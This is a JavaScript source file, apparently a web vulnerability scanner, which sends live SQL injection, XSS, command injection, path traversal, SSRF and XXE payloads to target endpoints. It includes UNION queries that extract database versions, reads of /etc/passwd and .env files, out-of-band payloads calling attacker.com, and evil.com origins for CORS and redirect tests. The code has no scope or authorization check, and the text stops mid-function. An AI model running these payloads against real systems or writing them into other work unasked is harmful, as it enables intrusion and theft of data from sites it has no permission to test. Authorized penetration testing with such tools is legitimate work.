// Advanced Exploitation Service - Real Bug Bounty Hunter Techniques
const axios = require('axios');
const ExploitationEngine = require('./exploitationEngine');
const ResponseAnalyzer = require('./responseAnalyzer');

class AdvancedExploitationService {
  /**
   * Differential Response Analysis (Real Bug Bounty Technique)
   * Compare responses with TRUE and FALSE conditions to detect blind vulnerabilities
   */
  static async differentialAnalysis(endpoint, parameter, basePayloads) {
    console.log(`      üîç Differential Analysis (Blind Vuln Detection)`);
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0
    };

    try {
      // Test 1: TRUE condition
      const truePayload = { payload: "1' AND '1'='1", type: 'SQLi' };
      const trueResponse = await ExploitationEngine.executeTest(endpoint, parameter, truePayload);
      
      // Test 2: FALSE condition
      const falsePayload = { payload: "1' AND '1'='2", type: 'SQLi' };
      const falseResponse = await ExploitationEngine.executeTest(endpoint, parameter, falsePayload);
      
      // Test 3: Baseline (normal)
      const baselinePayload = { payload: "1", type: 'SQLi' };
      const baselineResponse = await ExploitationEngine.executeTest(endpoint, parameter, baselinePayload);
      
      if (trueResponse.success && falseResponse.success && baselineResponse.success) {
        const trueLen = String(trueResponse.data || '').length;
        const falseLen = String(falseResponse.data || '').length;
        const baseLen = String(baselineResponse.data || '').length;
        
        // If TRUE response matches baseline but FALSE is different = Boolean-based Blind SQLi
        if (Math.abs(trueLen - baseLen) < 100 && Math.abs(falseLen - baseLen) > 100) {
          results.vulnerable = true;
          results.type = 'Blind SQLi (Boolean-based)';
          results.evidence.push(`TRUE response length: ${trueLen}`);
          results.evidence.push(`FALSE response length: ${falseLen}`);
          results.evidence.push(`Baseline length: ${baseLen}`);
          results.evidence.push(`Difference detected: ${Math.abs(trueLen - falseLen)} bytes`);
          results.confidence = 85;
          
          console.log(`         ‚úÖ Boolean-based Blind SQLi detected!`);
          console.log(`            TRUE=${trueLen} bytes, FALSE=${falseLen} bytes (Diff: ${Math.abs(trueLen - falseLen)})`);
        }
      }
    } catch (error) {
      console.log(`         ‚ö† Differential analysis error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Time-based Blind SQLi Detection (Used by SQLMap)
   */
  static async timeBasedDetection(endpoint, parameter) {
    console.log(`      ‚è±Ô∏è  Time-based Blind SQLi Detection`);
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0
    };

    try {
      // Baseline request
      const baselineStart = Date.now();
      await ExploitationEngine.executeTest(endpoint, parameter, { payload: '1', type: 'SQLi' });
      const baselineTime = Date.now() - baselineStart;
      
      // Time-based SQLi payloads (5 second delay)
      const timePayloads = [
        "1' AND SLEEP(5)--",
        "1' OR SLEEP(5)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1'; WAITFOR DELAY '00:00:05'--" // MSSQL
      ];
      
      for (const payloadStr of timePayloads) {
        const testStart = Date.now();
        const payload = { payload: payloadStr, type: 'SQLi' };
        await ExploitationEngine.executeTest(endpoint, parameter, payload);
        const testTime = Date.now() - testStart;
        
        // If response took 5+ seconds (but baseline was fast), it's time-based SQLi
        if (testTime >= 4500 && baselineTime < 2000) {
          results.vulnerable = true;
          results.type = 'Time-based Blind SQLi';
          results.evidence.push(`Baseline: ${baselineTime}ms`);
          results.evidence.push(`With SLEEP(5): ${testTime}ms`);
          results.evidence.push(`Payload: ${payloadStr}`);
          results.confidence = 95;
          
          console.log(`         ‚úÖ Time-based Blind SQLi confirmed!`);
          console.log(`            Baseline: ${baselineTime}ms ‚Üí Delayed: ${testTime}ms`);
          break;
        }
      }
    } catch (error) {
      console.log(`         ‚ö† Time-based test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Error-based SQLi with advanced payloads (Real bug bounty technique)
   */
  static async errorBasedSQLi(endpoint, parameter) {
    console.log(`      üí• Error-based SQLi Detection`);
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0,
      payloadUsed: null
    };

    // Advanced error-based payloads that trigger verbose errors
    const errorPayloads = [
      "'",
      "''",
      "' OR '1",
      "1' AND '1'='1' AND '1",
      "1' AND extractvalue(1,concat(0x7e,version()))--",
      "1' AND updatexml(1,concat(0x7e,database()),1)--",
      "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "1' AND 1=CONVERT(int,(SELECT @@version))--", // MSSQL
      "1' AND 1=CAST((SELECT version()) AS int)--" // PostgreSQL
    ];

    try {
      for (const payloadStr of errorPayloads) {
        const payload = { payload: payloadStr, type: 'SQLi' };
        const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
        
        if (response.success) {
          const data = String(response.data || '').toLowerCase();
          
          // Check for SQL error patterns
          const errorPatterns = [
            /you have an error in your sql syntax/i,
            /warning: mysql/i,
            /unclosed quotation mark/i,
            /quoted string not properly terminated/i,
            /ora-\d{5}/i,
            /pg_query\(\)/i,
            /sqlite_/i,
            /sql syntax.*mysql/i,
            /valid mysql result/i,
            /MySqlClient\./i,
            /com\.mysql\.jdbc/i,
            /microsoft sql native client/i
          ];
          
          for (const pattern of errorPatterns) {
            if (pattern.test(data)) {
              results.vulnerable = true;
              results.type = 'Error-based SQLi';
              results.evidence.push(`SQL error detected: ${pattern.toString()}`);
              results.evidence.push(`Payload: ${payloadStr}`);
              results.payloadUsed = payloadStr;
              results.confidence = 95;
              
              // Extract error snippet
              const match = data.match(/.{0,100}(mysql|sql|ora-|pg_query).{0,100}/i);
              if (match) {
                results.evidence.push(`Error snippet: ${match[0]}`);
              }
              
              console.log(`         ‚úÖ Error-based SQLi confirmed!`);
              console.log(`            Payload: ${payloadStr}`);
              console.log(`            Error: ${match ? match[0].substring(0, 80) : 'SQL error found'}`);
              
              return results; // Stop on first confirmed
            }
          }
        }
        
        // Rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.log(`         ‚ö† Error-based test failed: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Reflected XSS with context awareness (Real bug bounty technique)
   */
  static async contextAwareXSS(endpoint, parameter) {
    console.log(`      üéØ Context-aware XSS Detection`);
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0,
      context: null
    };

    try {
      // Step 1: Identify reflection context with a unique marker
      const marker = `ZER0N_XSS_${Math.random().toString(36).substring(7)}`;
      const markerPayload = { payload: marker, type: 'XSS' };
      const markerResponse = await ExploitationEngine.executeTest(endpoint, parameter, markerPayload);
      
      if (!markerResponse.success || !markerResponse.data) {
        console.log(`         ‚ö† No response data received`);
        return results;
      }
      
      const data = String(markerResponse.data);
      
      if (!data.includes(marker)) {
        console.log(`         ‚ö† Parameter not reflected in response`);
        
        // FALLBACK: Test with common XSS payloads even if marker not found
        console.log(`         üîÑ Testing blind XSS payloads...`);
        const blindPayloads = [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '"><script>alert(1)</script>'
        ];
        
        for (const payloadStr of blindPayloads) {
          const payload = { payload: payloadStr, type: 'XSS' };
          const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
          
          if (response.success && response.data) {
            const responseData = String(response.data);
            
            // Check if payload appears unencoded
            if (responseData.includes('<script>') || 
                responseData.includes('onerror=') ||
                responseData.includes('onload=') ||
                responseData.includes(payloadStr)) {
              
              results.vulnerable = true;
              results.type = 'Reflected XSS';
              results.evidence.push(`Payload reflected unencoded: ${payloadStr}`);
              results.evidence.push(`Found in response`);
              results.confidence = 85;
              
              console.log(`         ‚úÖ Blind XSS confirmed!`);
              console.log(`            Payload: ${payloadStr}`);
              
              return results;
            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        return results;
      }
      
      // Detect context
      let context = 'unknown';
      if (data.match(new RegExp(`value=['"]${marker}['"]`, 'i'))) {
        context = 'attribute';
      } else if (data.match(new RegExp(`<[^>]*${marker}[^>]*>`, 'i'))) {
        context = 'tag';
      } else if (data.match(new RegExp(`<script[^>]*>.*${marker}.*</script>`, 'is'))) {
        context = 'script';
      } else if (data.includes(marker)) {
        context = 'html';
      }
      
      results.context = context;
      console.log(`         üìç Reflection context: ${context}`);
      
      // Step 2: Test context-specific payloads
      let testPayloads = [];
      
      switch (context) {
        case 'attribute':
          testPayloads = [
            '" onload="alert(1)"',
            "' onload='alert(1)'",
            '" autofocus onfocus="alert(1)"',
            '"><img src=x onerror=alert(1)>'
          ];
          break;
        case 'tag':
          testPayloads = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>'
          ];
          break;
        case 'script':
          testPayloads = [
            '\';alert(1);//',
            '\";alert(1);//',
            '</script><script>alert(1)</script>'
          ];
          break;
        case 'html':
        default:
          testPayloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>'
          ];
      }
      
      // Step 3: Test payloads
      for (const payloadStr of testPayloads) {
        const payload = { payload: payloadStr, type: 'XSS' };
        const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
        
        if (response.success && response.data) {
          const responseData = String(response.data);
          
          // Check if payload is reflected unencoded (or dangerous tags present)
          if (responseData.includes(payloadStr) || 
              responseData.includes('<script>') ||
              responseData.includes('onerror=') ||
              responseData.includes('onload=') ||
              responseData.includes('javascript:')) {
            
            results.vulnerable = true;
            results.type = 'Reflected XSS';
            results.evidence.push(`Payload reflected unencoded: ${payloadStr}`);
            results.evidence.push(`Context: ${context}`);
            results.confidence = 90;
            
            console.log(`         ‚úÖ Reflected XSS confirmed!`);
            console.log(`            Context: ${context}`);
            console.log(`            Payload: ${payloadStr}`);
            
            return results;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.log(`         ‚ö† XSS test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * UNION-based SQLi with column detection (Real bug bounty technique)
   */
  static async unionBasedSQLi(endpoint, parameter) {
    console.log(`      üîó UNION-based SQLi Detection`);
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0,
      columns: 0
    };

    try {
      // Step 1: Detect number of columns using ORDER BY
      let columnCount = 0;
      for (let i = 1; i <= 10; i++) {
        const payload = { payload: `1' ORDER BY ${i}--`, type: 'SQLi' };
        const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
        
        if (response.success) {
          const data = String(response.data || '').toLowerCase();
          
          // If we get an error, we've exceeded the column count
          if (data.includes('unknown column') || data.includes('error') || data.includes('invalid')) {
            columnCount = i - 1;
            console.log(`         üìä Detected ${columnCount} columns`);
            break;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      if (columnCount === 0) {
        console.log(`         ‚ö† Could not detect column count`);
        return results;
      }
      
      // Step 2: Test UNION SELECT with detected columns
      const nulls = Array(columnCount).fill('NULL').join(',');
      const unionPayload = { payload: `1' UNION SELECT ${nulls}--`, type: 'SQLi' };
      const unionResponse = await ExploitationEngine.executeTest(endpoint, parameter, unionPayload);
      
      if (unionResponse.success) {
        const data = String(unionResponse.data || '');
        
        // Check if UNION was successful (no error)
        if (!data.toLowerCase().includes('error') && !data.toLowerCase().includes('syntax')) {
          results.vulnerable = true;
          results.type = 'UNION-based SQLi';
          results.evidence.push(`Column count: ${columnCount}`);
          results.evidence.push(`UNION payload successful: ${unionPayload.payload}`);
          results.confidence = 90;
          results.columns = columnCount;
          
          console.log(`         ‚úÖ UNION-based SQLi confirmed!`);
          console.log(`            Columns: ${columnCount}`);
          console.log(`            Payload: ${unionPayload.payload}`);
          
          // Try to extract database info
          const infoPayload = { 
            payload: `1' UNION SELECT ${Array(columnCount-1).fill('NULL').join(',')},version()--`, 
            type: 'SQLi' 
          };
          const infoResponse = await ExploitationEngine.executeTest(endpoint, parameter, infoPayload);
          
          if (infoResponse.success) {
            const infoData = String(infoResponse.data || '');
            const versionMatch = infoData.match(/\d+\.\d+\.\d+/);
            if (versionMatch) {
              results.evidence.push(`Database version extracted: ${versionMatch[0]}`);
              console.log(`            Database version: ${versionMatch[0]}`);
            }
          }
        }
      }
    } catch (error) {
      console.log(`         ‚ö† UNION test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Out-of-Band (OOB) Detection using DNS/HTTP callbacks (Advanced technique)
   */
  static async outOfBandDetection(endpoint, parameter) {
    console.log(`      üåê Out-of-Band (OOB) Detection`);
    
    // Note: In a real bug bounty scenario, you'd use services like:
    // - Burp Collaborator
    // - interactsh.com
    // - RequestBin
    // For this demo, we'll just check if the payloads are injectable
    
    const results = {
      vulnerable: false,
      type: null,
      evidence: [],
      confidence: 0
    };

    try {
      const oobPayloads = [
        // DNS-based detection (would need Burp Collaborator)
        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a')))--",
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--",
        
        // XXE with external entity
        '<?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
        
        // SSRF attempts
        'http://burpcollaborator.net',
        'http://169.254.169.254/latest/meta-data/'
      ];
      
      for (const payloadStr of oobPayloads) {
        const payload = { payload: payloadStr, type: 'OOB' };
        const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
        
        if (response.success) {
          const data = String(response.data || '');
          
          // Check for successful injection (no immediate error)
          if (!data.toLowerCase().includes('error') && response.status === 200) {
            results.evidence.push(`OOB payload accepted: ${payloadStr.substring(0, 50)}...`);
            console.log(`         ‚ÑπÔ∏è  OOB payload accepted (manual verification needed)`);
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 150));
      }
      
      if (results.evidence.length > 0) {
        results.type = 'Potential OOB Injection';
        results.confidence = 40; // Lower confidence, needs manual verification
        console.log(`         ‚ö† Potential OOB injection (requires manual DNS/HTTP callback verification)`);
      }
    } catch (error) {
      console.log(`         ‚ö† OOB test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Execute ALL advanced techniques in SYSTEMATIC ORDER (master function)
   * Tests one vulnerability type at a time across all parameters
   */
  static async runAdvancedExploitation(endpoint, parameter, options = {}) {
    console.log(`    üöÄ Advanced Exploitation Techniques`);
    
    const results = [];
    const testingMode = options.mode || 'comprehensive'; // 'xss-first', 'sqli-first', 'comprehensive'
    
    if (testingMode === 'xss-first') {
      // Test XSS first
      const xss = await this.contextAwareXSS(endpoint, parameter);
      if (xss.vulnerable) results.push(xss);
      
      // Then SQLi
      const errorBased = await this.errorBasedSQLi(endpoint, parameter);
      if (errorBased.vulnerable) {
        results.push(errorBased);
        const unionBased = await this.unionBasedSQLi(endpoint, parameter);
        if (unionBased.vulnerable) results.push(unionBased);
      }
      
    } else if (testingMode === 'sqli-first') {
      // Test SQLi first
      const errorBased = await this.errorBasedSQLi(endpoint, parameter);
      if (errorBased.vulnerable) {
        results.push(errorBased);
        const unionBased = await this.unionBasedSQLi(endpoint, parameter);
        if (unionBased.vulnerable) results.push(unionBased);
      } else {
        const differential = await this.differentialAnalysis(endpoint, parameter);
        if (differential.vulnerable) results.push(differential);
        
        const timeBased = await this.timeBasedDetection(endpoint, parameter);
        if (timeBased.vulnerable) results.push(timeBased);
      }
      
      // Then XSS
      const xss = await this.contextAwareXSS(endpoint, parameter);
      if (xss.vulnerable) results.push(xss);
      
    } else {
      // Comprehensive testing (original)
      const errorBased = await this.errorBasedSQLi(endpoint, parameter);
      if (errorBased.vulnerable) results.push(errorBased);
      
      const differential = await this.differentialAnalysis(endpoint, parameter);
      if (differential.vulnerable) results.push(differential);
      
      if (!errorBased.vulnerable) {
        const timeBased = await this.timeBasedDetection(endpoint, parameter);
        if (timeBased.vulnerable) results.push(timeBased);
      }
      
      if (errorBased.vulnerable) {
        const unionBased = await this.unionBasedSQLi(endpoint, parameter);
        if (unionBased.vulnerable) results.push(unionBased);
      }
      
      const xss = await this.contextAwareXSS(endpoint, parameter);
      if (xss.vulnerable) results.push(xss);
      
      const oob = await this.outOfBandDetection(endpoint, parameter);
      if (oob.evidence.length > 0) results.push(oob);
    }
    
    return results;
  }
  
  /**
   * Test ONLY XSS vulnerabilities
   */
  static async testXSSOnly(endpoint, parameter) {
    console.log(`    üéØ Testing XSS Vulnerabilities Only`);
    const results = [];
    
    const xss = await this.contextAwareXSS(endpoint, parameter);
    if (xss.vulnerable) results.push(xss);
    
    return results;
  }
  
  /**
   * Test ONLY SQLi vulnerabilities
   */
  static async testSQLiOnly(endpoint, parameter) {
    console.log(`    üéØ Testing SQL Injection Vulnerabilities Only`);
    const results = [];
    
    // 1. Error-based
    const errorBased = await this.errorBasedSQLi(endpoint, parameter);
    if (errorBased.vulnerable) {
      results.push(errorBased);
      
      // If error-based found, try UNION
      const unionBased = await this.unionBasedSQLi(endpoint, parameter);
      if (unionBased.vulnerable) results.push(unionBased);
    } else {
      // 2. Boolean-based Blind
      const differential = await this.differentialAnalysis(endpoint, parameter);
      if (differential.vulnerable) results.push(differential);
      
      // 3. Time-based Blind
      const timeBased = await this.timeBasedDetection(endpoint, parameter);
      if (timeBased.vulnerable) results.push(timeBased);
    }
    
    return results;
  }
  
  /**
   * Test SSRF vulnerabilities
   */
  static async testSSRFOnly(endpoint, parameter) {
    console.log(`    üéØ Testing SSRF Vulnerabilities Only`);
    const results = [];
    
    // SSRF detection logic here
    const ssrfPayloads = [
      'http://localhost',
      'http://127.0.0.1',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/'
    ];
    
    for (const payloadStr of ssrfPayloads) {
      const payload = { payload: payloadStr, type: 'SSRF' };
      const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
      
      if (response.success && response.data) {
        const data = String(response.data).toLowerCase();
        
        if (data.includes('localhost') || data.includes('internal') || 
            data.includes('metadata') || data.includes('ami-id')) {
          results.push({
            vulnerable: true,
            type: 'SSRF',
            evidence: [`SSRF payload accepted: ${payloadStr}`, 'Internal content detected'],
            confidence: 80,
            payloadUsed: payloadStr
          });
          break;
        }
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return results;
  }
  
  /**
   * Test Command Injection (RCE)
   */
  static async testRCEOnly(endpoint, parameter) {
    console.log(`    üéØ Testing Remote Code Execution Only`);
    const results = [];
    
    const rcePayloads = [
      '; whoami',
      '| id',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/passwd',
      '| ls -la'
    ];
    
    for (const payloadStr of rcePayloads) {
      const payload = { payload: payloadStr, type: 'RCE' };
      const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
      
      if (response.success && response.data) {
        const data = String(response.data).toLowerCase();
        
        if (data.includes('uid=') || data.includes('gid=') || 
            data.includes('root:') || data.includes('www-data')) {
          results.push({
            vulnerable: true,
            type: 'Remote Code Execution',
            evidence: [`RCE payload executed: ${payloadStr}`, 'Command output detected'],
            confidence: 95,
            payloadUsed: payloadStr
          });
          break;
        }
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return results;
  }

  /**
   * Test Information Disclosure
   * Detects sensitive information leakage like:
   * - Configuration files exposure
   * - Source code disclosure
   * - Database errors with stack traces
   * - API keys/credentials
   * - Directory listings
   * - Debug information
   */
  static async testInfoDisclosureOnly(endpoint, parameter) {
    console.log(`    üéØ Testing Information Disclosure Only`);
    const results = [];
    
    // Payloads to trigger info disclosure
    const infoPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system.ini',
      '/etc/passwd',
      'C:\\windows\\system.ini',
      '../config.php',
      '../wp-config.php',
      '.env',
      '../.env',
      'config.json',
      '../../../../../etc/hosts',
      'phpinfo.php',
      'info.php',
      'test.php',
      '/proc/self/environ',
      '../app/config/database.yml'
    ];
    
    for (const payloadStr of infoPayloads) {
      const payload = { payload: payloadStr, type: 'InfoDisclosure' };
      const response = await ExploitationEngine.executeTest(endpoint, parameter, payload);
      
      if (response.success && response.data) {
        const data = String(response.data).toLowerCase();
        const originalData = String(response.data);
        
        // Check for sensitive patterns
        const sensitivePatterns = [
          { pattern: /root:.*:0:0:/i, name: 'Unix passwd file', confidence: 95 },
          { pattern: /\[extensions\]|; for 16-bit app support/i, name: 'Windows system.ini', confidence: 95 },
          { pattern: /db_password|db_host|database_url/i, name: 'Database credentials', confidence: 90 },
          { pattern: /api[_-]?key|secret[_-]?key|access[_-]?token/i, name: 'API keys/tokens', confidence: 90 },
          { pattern: /mysql_connect|mysqli_connect|pg_connect/i, name: 'Database connection code', confidence: 85 },
          { pattern: /phpinfo\(\)|php version/i, name: 'PHP configuration info', confidence: 85 },
          { pattern: /stack trace|exception.*at line \d+|fatal error/i, name: 'Error with stack trace', confidence: 80 },
          { pattern: /aws_access_key|aws_secret|amazon.*credentials/i, name: 'AWS credentials', confidence: 95 },
          { pattern: /private[_-]?key|BEGIN.*PRIVATE KEY/i, name: 'Private key', confidence: 95 },
          { pattern: /\$_server\[|php_self|document_root/i, name: 'PHP environment variables', confidence: 75 },
          { pattern: /localhost:3306|localhost:5432|mongodb:\/\//i, name: 'Internal database connection', confidence: 80 },
          { pattern: /index of \/|parent directory|last modified/i, name: 'Directory listing', confidence: 85 }
        ];
        
        for (const { pattern, name, confidence } of sensitivePatterns) {
          if (pattern.test(originalData)) {
            const evidenceSnippet = originalData.match(pattern)?.[0] || 'Sensitive pattern detected';
            results.push({
              vulnerable: true,
              type: 'Information Disclosure',
              subType: name,
              evidence: [
                `Info Disclosure detected: ${name}`,
                `Payload: ${payloadStr}`,
                `Evidence: ${evidenceSnippet.substring(0, 100)}...`
              ],
              confidence: confidence,
              payloadUsed: payloadStr,
              context: name
            });
            break; // Found info disclosure, move to next payload
          }
        }
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return results;
  }

  /**
   * Test IDOR (Insecure Direct Object Reference)
   * Professional technique: Horizontal privilege escalation detection
   * Tests if changing ID/reference allows access to other users' data
   */
  static async testIDOROnly(endpoint, parameter) {
    console.log(`    üéØ Testing IDOR (Insecure Direct Object Reference) Only`);
    const results = [];
    
    // Skip if parameter is invalid
    if (!parameter || !parameter.name || parameter.name === 'undefined') {
      return results;
    }
    
    // Only test parameters that look like IDs or references
    const idPatterns = ['id', 'user', 'account', 'profile', 'uid', 'pid', 'doc', 'file', 'order', 'invoice'];
    const isLikelyID = idPatterns.some(pattern => 
      parameter.name.toLowerCase().includes(pattern)
    );
    
    if (!isLikelyID && parameter.classification !== 'id') {
      console.log(`       ‚ö† Parameter doesn't look like an ID, skipping IDOR test`);
      return results;
    }
    
    try {
      // Step 1: Get baseline response with original value
      const baselinePayload = { payload: '1', type: 'IDOR' };
      const baselineResponse = await ExploitationEngine.executeTest(endpoint, parameter, baselinePayload);
      
      if (!baselineResponse.success) {
        return results;
      }
      
      const baselineData = String(baselineResponse.data || '');
      const baselineLength = baselineData.length;
      const baselineStatus = baselineResponse.status || 200;
      
      // Step 2: Test with different ID values to detect IDOR
      const idTestCases = [
        { value: '2', description: 'Sequential ID +1' },
        { value: '999', description: 'High numeric ID' },
        { value: '0', description: 'ID zero' },
        { value: '-1', description: 'Negative ID' },
        { value: 'admin', description: 'Admin username' },
        { value: 'root', description: 'Root username' },
        { value: '00000000-0000-0000-0000-000000000001', description: 'UUID pattern' }
      ];
      
      for (const testCase of idTestCases) {
        const testPayload = { payload: testCase.value, type: 'IDOR' };
        const testResponse = await ExploitationEngine.executeTest(endpoint, parameter, testPayload);
        
        if (testResponse.success && testResponse.data) {
          const testData = String(testResponse.data);
          const testLength = testData.length;
          const testStatus = testResponse.status || 200;
          
          // IDOR Detection Logic:
          // 1. Response is successful (200-299)
          // 2. Response is not error page
          // 3. Response has substantial content
          // 4. Response differs from baseline (different user data)
          
          const isSuccessful = testStatus >= 200 && testStatus < 300;
          const hasContent = testLength > 100;
          const notErrorPage = !testData.toLowerCase().includes('error') && 
                               !testData.toLowerCase().includes('not found') &&
                               !testData.toLowerCase().includes('access denied');
          const isDifferent = Math.abs(testLength - baselineLength) > 50 || 
                            this._calculateSimilarity(baselineData, testData) < 0.9;
          
          // Check for sensitive data patterns in response
          const hasSensitiveData = /email|phone|address|ssn|credit|password|token|api[_-]?key/i.test(testData);
          
          if (isSuccessful && hasContent && notErrorPage && isDifferent) {
            const confidence = hasSensitiveData ? 95 : 80;
            
            results.push({
              vulnerable: true,
              type: 'IDOR',
              subType: 'Horizontal Privilege Escalation',
              evidence: [
                `IDOR detected: Access to other user's data via ${testCase.description}`,
                `Original ID response: ${baselineLength} bytes`,
                `Modified ID (${testCase.value}) response: ${testLength} bytes`,
                `Status: ${testStatus}`,
                hasSensitiveData ? 'Response contains sensitive data patterns' : 'Response differs significantly'
              ],
              confidence: confidence,
              payloadUsed: testCase.value,
              context: `${testCase.description} - Accessed unauthorized data`
            });
            
            console.log(`         ‚úÖ IDOR confirmed! ${testCase.description} exposed other user data`);
            break; // Found IDOR, no need to test more
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 150));
      }
      
    } catch (error) {
      console.error(`       ‚úó IDOR test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Test CORS Misconfiguration
   * Professional technique: Check if API reflects arbitrary origins with credentials
   */
  static async testCORSOnly(endpoint, parameter) {
    console.log(`    üéØ Testing CORS Misconfiguration Only`);
    const results = [];
    
    try {
      const axios = require('axios');
      
      // Test multiple dangerous CORS configurations
      const corsTests = [
        { 
          origin: 'https://evil.com', 
          description: 'Arbitrary origin reflection',
          severity: 95 
        },
        { 
          origin: 'null', 
          description: 'Null origin acceptance',
          severity: 90 
        },
        { 
          origin: 'https://attacker.example.com', 
          description: 'Subdomain pattern matching',
          severity: 85 
        }
      ];
      
      for (const test of corsTests) {
        try {
          const response = await axios.get(endpoint.url, {
            headers: {
              'Origin': test.origin,
              'User-Agent': 'Mozilla/5.0'
            },
            validateStatus: () => true,
            maxRedirects: 0,
            timeout: 5000
          });
          
          const allowOrigin = response.headers['access-control-allow-origin'];
          const allowCredentials = response.headers['access-control-allow-credentials'];
          
          // Critical CORS misconfiguration:
          // 1. Reflects our malicious origin
          // 2. Allows credentials
          // 3. This means attacker can steal user data
          
          if (allowOrigin && allowCredentials === 'true') {
            const isReflected = allowOrigin === test.origin || allowOrigin === '*';
            
            if (isReflected) {
              results.push({
                vulnerable: true,
                type: 'CORS Misconfiguration',
                subType: test.description,
                evidence: [
                  `CORS allows credentials with ${test.description}`,
                  `Access-Control-Allow-Origin: ${allowOrigin}`,
                  `Access-Control-Allow-Credentials: ${allowCredentials}`,
                  `Attack vector: ${test.origin}`,
                  'Attacker can steal sensitive data via malicious website'
                ],
                confidence: test.severity,
                payloadUsed: test.origin,
                context: `Origin: ${test.origin}`
              });
              
              console.log(`         ‚úÖ CORS misconfiguration! Reflects ${test.origin} with credentials`);
              break; // Found CORS issue
            }
          }
        } catch (error) {
          // Connection errors are expected, continue
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      console.error(`       ‚úó CORS test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Test Open Redirect
   * Professional technique: Test redirect parameters with external URLs
   */
  static async testOpenRedirectOnly(endpoint, parameter) {
    console.log(`    üéØ Testing Open Redirect Only`);
    const results = [];
    
    // Skip if parameter is invalid
    if (!parameter || !parameter.name || parameter.name === 'undefined') {
      return results;
    }
    
    // Only test parameters that look like redirect/URL parameters
    const redirectPatterns = ['redirect', 'url', 'next', 'return', 'goto', 'continue', 'dest', 'target', 'redir', 'forward'];
    const isLikelyRedirect = redirectPatterns.some(pattern => 
      parameter.name.toLowerCase().includes(pattern)
    );
    
    if (!isLikelyRedirect) {
      console.log(`       ‚ö† Parameter doesn't look like redirect, skipping`);
      return results;
    }
    
    try {
      const axios = require('axios');
      
      // Professional open redirect payloads
      const redirectPayloads = [
        { payload: 'https://evil.com', bypass: 'Direct external URL' },
        { payload: '//evil.com', bypass: 'Protocol-relative URL' },
        { payload: 'https://evil.com@legitimate.com', bypass: 'URL with @ symbol' },
        { payload: '/\\evil.com', bypass: 'Backslash bypass' },
        { payload: 'javascript:alert(1)', bypass: 'JavaScript protocol' },
        { payload: '///evil.com', bypass: 'Triple slash bypass' },
        { payload: 'https://legitimate.com.evil.com', bypass: 'Subdomain confusion' }
      ];
      
      for (const test of redirectPayloads) {
        try {
          // Build URL with redirect parameter
          const testUrl = new URL(endpoint.url);
          testUrl.searchParams.set(parameter.name, test.payload);
          
          const response = await axios.get(testUrl.toString(), {
            maxRedirects: 0,
            validateStatus: () => true,
            timeout: 3000,
            headers: {
              'User-Agent': 'Mozilla/5.0'
            }
          });
          
          // Check for redirect to external domain
          const isRedirect = response.status >= 300 && response.status < 400;
          const locationHeader = response.headers['location'];
          
          if (isRedirect && locationHeader) {
            // Check if redirects to our evil domain
            const redirectsToExternal = locationHeader.includes('evil.com') ||
                                       locationHeader.startsWith('//evil.com') ||
                                       locationHeader.includes('javascript:') ||
                                       (locationHeader.startsWith('http') && !locationHeader.includes(new URL(endpoint.url).hostname));
            
            if (redirectsToExternal) {
              results.push({
                vulnerable: true,
                type: 'Open Redirect',
                subType: test.bypass,
                evidence: [
                  `Open redirect detected using ${test.bypass}`,
                  `Payload: ${test.payload}`,
                  `Location header: ${locationHeader}`,
                  `Status: ${response.status}`,
                  'Attacker can use this for phishing attacks'
                ],
                confidence: 90,
                payloadUsed: test.payload,
                context: test.bypass
              });
              
              console.log(`         ‚úÖ Open Redirect found! ${test.bypass}`);
              break;
            }
          }
          
        } catch (error) {
          // Expected for some payloads
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
